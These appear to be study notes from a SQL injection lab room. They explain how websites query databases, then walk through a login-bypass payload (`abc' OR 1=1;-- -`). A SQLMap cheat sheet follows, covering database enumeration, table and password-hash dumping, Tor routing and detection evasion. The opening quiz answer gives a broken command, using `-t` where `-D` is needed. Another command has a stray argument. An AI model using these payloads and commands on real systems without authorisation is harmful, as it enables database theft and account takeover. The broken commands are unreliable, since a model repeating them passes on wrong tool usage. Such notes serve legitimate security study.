[[Structured Query Language]]
SQL injection is a prevalent vulnerability and has long been a hot topic in cyber security. To understand this vulnerability, we must first learn what a database is and how websites interact with a database.

What would be the full command of SQLMap for extracting all tables from the "members" database? (Vulnerable URL: http://sqlmaptesting.thm/search/cat=1)

```
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -t members --dump --tables
```

```
sqlmap -u 'http://10.10.209.89/ai/includes/user_login?email=test&password=test'  -D ai --tables --level=5 users
```
A database is a collection of data that can be stored, modified, and retrieved. It stores data from several applications in a structured format, making storage, modification, and retrieval easy and efficient. You interact with several websites daily. The website contains some of the web pages where user input is required. For instance, a website with a login page asks you to enter your credentials, and once you enter them, it checks if the credentials are correct and logs you in if they are. As many users log in to that website, how does that website record all these users’ data and verify it during the authentication process? This is all done with the help of a database. These websites have databases that store the user and other information and retrieve it when needed. So when you enter your credentials to a website’s login page, the website interacts with its database to check if these credentials are correct. Similarly, if you have an input field to search for something, for instance, an input field of a bookshop website allows you to search for the available books for sale. When you search for any book, the website will interact with the database to fetch the record of that book and display it on the website.

Now, we know that the website asks the database to retrieve, store, or modify any data. So, how does this interaction take place? The databases are managed by Database Management Systems (DBMS), such as MySQL, PostgreSQL, SQLite, or Microsoft SQL Server. These systems understand the Structured Query Language (SQL). So, any application or website uses SQL queries when interacting with the database.

---
In the previous task, we studied how websites and applications interact with databases to store, modify, and retrieve their data in a structured manner. In this task, we will see how the interaction between an application and a database happens through SQL queries and how attackers can leverage these SQL queries to perform SQL injection attacks.

**Note**: Before we proceed, please ensure that you try the manual or automated SQL injection methods only after the permission of the application owner.

  
![Database with an injection depicting the exploitation of SQL injection vulnerability.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6645aa8c024f7893371eb7ac/room-content/6645aa8c024f7893371eb7ac-1727955724338.png)

Let’s take an example of a login page that asks you to enter your username and password to log in. Let’s provide it with the following data:

`Username: John`

`Password: Un@detectable444`

Once you enter your username and password, the website will receive it, make an SQL query with your credentials, and send it to the database. 

 `SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';`
        

This query will be executed in the database. As per this query, the database will check for a user named `John` and the password of `Un@detectable444`. If it finds such a user, it will return the user’s details to the application. Note that the above query will be successful only if the given user and pass both have a match together in the database as they are separated by the boolean “AND”.

Sometimes, when input is improperly sanitized, meaning that user input is not validated, attackers can manipulate the input and write SQL queries that would get executed in the database and perform the attacker’s desired actions. SQL injection has a very harmful effect in this digital world as all organizations store their data, including their critical information, inside the databases, and a successful SQL injection attack can compromise their critical data.

Let’s assume the website login page we discussed above lacks input validation and sanitization. This means that it is vulnerable to SQL injection. The attacker does not know the password of the user John. They will type the following input in the given fields:

`Username: John`

`Password: abc' OR 1=1;-- -`

This time, the attacker typed a random string `abc` and an injected string `' OR 1=1;-- -`. The SQL query that the website would send to the database will now become the following:

 `SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';`
        

This statement looks similar to the previous SQL query but now adds another condition with the operator `OR`. This query will see if there is a user, John. Then, it will check if John has the password `abc` (which he could not have because the attacker entered a random password). Ideally, the query should fail here because it expects both username and password to be correct, as there is an `AND` operator between them. But, this query has another condition, `OR`, between the password and a statement `1=1`. Any one of them being true will make the whole SQL query successful. The password failed, so the query will check the next condition, which checks if `1=1`. As we know, `1=1` is always true, so it will ignore the random password entered before this and consider this statement as true, which will successfully execute this query. The `-- -` at the end of the query would comment anything after `1=1`, which means the query would be successfully executed, and the attacker would get logged in to John’s user account.

One of the important things to note here is the use of a single quote `'` after `abc`. Without this single quote,`'` the whole string `'abc OR 1=1;-- -'` would be considered the password, which is not intended. However, if we add a single quote `'` after `abc`, the password would look like `'abc' OR 1=1;---'`, which encloses the original string abc in the query and allows us to introduce a logical condition `OR 1=1`, which is always true.

---
# SQLMap Introductory Guide

**SQLMap** is an automated tool for detecting and exploiting SQL injection vulnerabilities in database systems. It simplifies the process of identifying and exploiting SQL injection flaws and retrieving data from affected databases. Below is a guide to help you get started with SQLMap:

## 1. Basic Command Structure

- **Basic Command**:
  ```bash
  sqlmap -u <target_url>
  ```
  Example:
  ```bash
  sqlmap -u "http://example.com/vulnerable_page.php?id=1"
  ```

- **Specify Parameters**:
  If the URL does not clearly show the parameters, you can specify them:
  ```bash
  sqlmap -u "http://example.com/search" --data="id=1"
  ```

## 2. Common SQLMap Options

- **Detect the DBMS**:
  ```bash
  sqlmap -u <target_url> --banner
  ```

- **Enumerate Database Information**:
  - **List Databases**:
    ```bash
    sqlmap -u <target_url> --dbs
    ```

  - **List Tables in a Database**:
    ```bash
    sqlmap -u <target_url> -D <database_name> --tables
    ```

  - **List Columns in a Table**:
    ```bash
    sqlmap -u <target_url> -D <database_name> -T <table_name> --columns
    ```

  - **Dump Data from a Table**:
    ```bash
    sqlmap -u <target_url> -D <database_name> -T <table_name> --dump
    ```

## 3. Advanced Options

- **Specify Injection Point**:
  ```bash
  sqlmap -u "http://example.com/vulnerable_page.php" --data="id=1" --dbms=mysql --level=5 --risk=3
  ```

- **Authentication Options**:
  - **HTTP Basic Authentication**:
    ```bash
    sqlmap -u <target_url> --auth-type=basic --auth-cred="username:password"
    ```

  - **Cookie-Based Authentication**:
    ```bash
    sqlmap -u <target_url> --cookie="PHPSESSID=123456789"
    ```

- **Tor Network for Anonymity**:
  ```bash
  sqlmap -u <target_url> --tor --tor-type=SOCKS5 --check-tor
  ```

## 4. Evading Detection

- **User-Agent Spoofing**:
  ```bash
  sqlmap -u <target_url> --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
  ```

- **Randomize User-Agent**:
  ```bash
  sqlmap -u <target_url> --random-agent
  ```

- **Delay Between Requests**:
  ```bash
  sqlmap -u <target_url> --delay=3
  ```

## 5. Interactive Modes

- **Batch Mode (No User Interaction)**:
  ```bash
  sqlmap -u <target_url> --batch
  ```

- **Use Tor for Anonymized Scans**:
  ```bash
  sqlmap -u <target_url> --tor --tor-type=SOCKS5 --check-tor
  ```

## 6. Useful Tips and Flags

- **Test Specific Parameters**:
  ```bash
  sqlmap -u <target_url> -p <parameter>
  ```

- **Custom HTTP Headers**:
  ```bash
  sqlmap -u <target_url> --headers="X-Forwarded-For: 127.0.0.1"
  ```

- **Output Results to a File**:
  ```bash
  sqlmap -u <target_url> --output-dir=/path/to/output_directory
  ```

- **Enumerate Database Users**:
  ```bash
  sqlmap -u <target_url> --users
  ```

- **Get Password Hashes**:
  ```bash
  sqlmap -u <target_url> --passwords
  ```

## 7. Best Practices

- **Run Legally and Ethically**:
  Ensure you have authorization before using SQLMap on any network or application.
  
- **Avoid Excessive Load**:
  Use flags like `--delay`, `--level`, and `--risk` appropriately to prevent excessive server load.

- **Sanitize Data**:
  Be cautious when dumping data and ensure it is handled securely and ethically.

This guide provides an overview of how to use SQLMap effectively for testing and exploiting SQL injection vulnerabilities.
